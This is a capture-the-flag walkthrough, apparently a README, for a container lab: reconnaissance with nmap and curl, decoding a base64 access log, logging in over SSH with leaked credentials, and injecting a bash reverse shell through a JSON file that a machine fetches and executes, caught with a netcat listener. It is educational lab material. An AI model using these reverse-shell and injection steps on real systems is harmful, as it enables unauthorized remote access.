## Walkthrough/tutorial

You’ve been provided with the ip addresses of the containers. Firstly, find the port on which the load balancer is serving the content, using `nmap`. If this is running on wsl or a VM, nmap that as the loadbalancer is exposed through port 8080. E.g. `nmap 172.22.121.123`. 

On the webpage, we are told to use `Accept : application/secret` on some requests. Furthermore it would make sense to reload the page with the network tab open. Noticing how the dialogue changes, one might look at the javascript and/or assume it's a get request.

![Screenshot 2025-06-09 121855](https://github.com/user-attachments/assets/44a3eb7c-cd05-4d41-b1f7-04edfc5d3ca3)


For simplicity, curl each webserver as the load balancer may give attention to 1-2 web servers due to timing.

```
curl <web1 ip>/s3cr3t/pasleyword  -> 22666C6167206973206174202F666C61672E747874h
curl <web2>/s3cr3t/pasleyword -> 404 Not Found
curl <web3>/s3cr3t/pasleyword -> Nothing here?
```
<br>
These are rather useless except for s3cr3t/pasleyword. <br>
Fixing the typo:

```
curl <web1 ip>/secret/password  ->  flag{L3g1t-fl_g}
curl <web2 ip>/secret/password -> in this request, look above
curl <web3 ip>/secret/password -> 
```
<br>
This is both confusing and misleading. Essentially, the hint from web2 means to check the response headers, since they sit above the response content. Furthermore, if we use the hint from before:

```
curl -i -H "Accept: application/secret" <web1 ip>/secret/password -> 
curl -i -H "Accept: application/secret" <web2 ip>/secret/password -> Snake, some of the comms have been hijacked, set the query = condition.the parameter is 'trust'
curl -i -H "Accept: application/secret" <web3 ip>/secret/password -> check access.log for 'Secret'
```
> - -i Include protocol response headers
> - -H adds a HTTP header to your request
> - Accept is typically used in web API’s to tell the server what type of response your client wants.

\
\
If we attempt to use the query/parameter hint at the moment we won’t find anything. So moving to web3:
```
curl <web3 ip>/access.log -o access1.log
```

Once the file is downloaded, you’ll notice the hashes end with = signs indicating they are encoded in base64:
\
\
![Screenshot 2025-06-09 132422](https://github.com/user-attachments/assets/5e7f3571-4836-4eb1-9442-e196ef8ef7a8)


```
grep -oP 'msg=\K[A-Za-z0-9+/=]+' access1.log | strings | base64 -d | grep "Secret"
```
> - -o Print only the matched (non-empty) parts
> - -P essentially enables regex

  
The regex will match everything after msg= and will then decode from base64, finally grepping “Secret”
This will return: `Secret: its a top secret password`
<br>
Considering the previous request was /secret/password, we can assume the complete request will be /top/secret/password. However, this won’t work. Instead if we combine everything together, we’ll get this: 
<br>
<br>

```
curl -i -H "Accept: application/secret" <any web ip>/top/secret/password?condition=trust
```
\
Which reveals:
`Snake, back on web3, the ssh on there is testuser:testpass. A protected_pc is broken and fetching a json file every so often from there`
<br>
So:

```
ssh testuser@<web 3 ip>
find / -name "*json" 2> /dev/null
```
Leading us to:
<br>

![Screenshot 2025-06-09 141728](https://github.com/user-attachments/assets/8fe4c56f-bbe5-4480-a75f-fb91a802d25c)

<br>
You’ll notice the file says echo, meaning perhaps this is being executed as bash. We can now enter our own malicious command to get reverse shell access.
<br>

![Screenshot 2025-06-09 141849](https://github.com/user-attachments/assets/f323b988-faa3-4e38-a336-51fea287128e)

> - bash -i → interactive bash shell
> - \>/dev/tcp/web3/1337 → opens a TCP connection to web3 on port 1337 and sends stdout there
> - 0>&1 → redirects stdin to the same place as stdout (so you can interact)
> - \>& is shorthand for redirecting both stdout (1) and stderr (2) to the TCP connection

<br>
Now we can listen to that port using netcat

```
nc -lvnp 1337
```
>- \-l → listen mode (wait for incoming connections)
>- \-v → verbose output (show connection details)
>- \-n → numeric-only IP addresses, no DNS lookups
>-  \-p 1337 → port number to listen on (here, 1337)

\
\
After a while:


![Screenshot 2025-06-09 142249](https://github.com/user-attachments/assets/bf3d3285-b2bc-4c29-8ce9-2b211a075a56)

Done!

